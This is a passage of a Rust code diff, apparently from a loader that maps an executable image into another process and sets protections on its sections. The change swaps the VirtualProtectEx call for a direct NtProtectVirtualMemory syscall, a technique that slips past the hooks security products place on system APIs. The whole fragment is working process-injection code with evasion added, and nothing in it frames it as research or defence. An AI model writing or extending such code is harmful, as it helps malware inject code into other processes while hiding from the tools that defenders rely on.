+            (true, false)  => PAGE_EXECUTE_READ,
+            (false, true)  => PAGE_READWRITE,
             (false, false) => PAGE_READONLY,
         };
         let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
-        if virt_size == 0 {
-            continue;
-        }
-        let addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
+        if virt_size == 0 { continue; }
+        let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
+        let mut sz = virt_size;
         let mut old = 0u32;
-        VirtualProtectEx(hprocess, addr, virt_size, protect, &mut old);
+        let _ = nt_syscall::syscall!(
+            "NtProtectVirtualMemory",
+            hprocess as u64, &mut addr as *mut _ as u64,
+            &mut sz as *mut _ as u64, protect as u64,
+            &mut old as *mut _ as u64,
+        );
     }
 }
 
